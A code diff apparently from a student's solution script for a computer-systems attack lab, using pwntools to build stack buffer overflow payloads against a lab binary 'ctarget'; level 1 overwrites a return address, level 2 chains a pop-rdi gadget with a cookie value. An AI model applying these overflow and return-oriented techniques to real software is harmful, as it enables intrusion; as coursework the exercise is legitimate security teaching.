@@ -1,14 +1,15 @@
 import os
+from typing import Callable
 
 import click
-from pwn import process
+from pwn import process, p64
 
 DIRECTORY = './answers/'
 BUF_SIZE = 56
 
 def check_level(level: int) -> bool: return level in [1, 2, 3, 4, 5]
 
-def get_solution_func(level: int) -> str:
+def get_solution_func(level: int) -> Callable[[bool], None]:
     match level:
         case 1:
             return solve_level_1
@@ -30,22 +31,31 @@ def print_solution(level: int, solution: bytes) -> None:
     path = os.path.join(DIRECTORY, f'level_{level}_solution')
     with open(path, 'wb') as f:
         f.write(solution)
-        
-def solve_level_1(flag: bool) -> None:
-    solution = (
-        b"a" * BUF_SIZE
-        (b"\x00\x00\x00\x00\x00\x40\x17\xfc"[::-1])
-    )
+
+def solve_ctarget(solution: bytes, flag: bool, level: int) -> None:
     if flag:
-        print_solution(1, solution)
+        print_solution(level, solution)
         return
     
     proc = process(['./ctarget', '-q'])
     proc.sendline(solution)
     proc.interactive()
+        
+def solve_level_1(flag: bool) -> None:
+    solution = (
+        b"a" * BUF_SIZE # padding
+        + p64(0x4017fc) # touch 1
+    )
+    solve_ctarget(solution, flag, 1)
 
 def solve_level_2(flag: bool) -> None:
-    pass
+    solution = (
+        b"a" * BUF_SIZE # padding
+        + p64(0x4028f0) # pop rdi; ret
+        + p64(0x11560ebd) # cookie value
+        + p64(0x401828) # touch 2
+    )
+    solve_ctarget(solution, flag, 2)
 
 def solve_level_3(flag: bool) -> None:
     pass
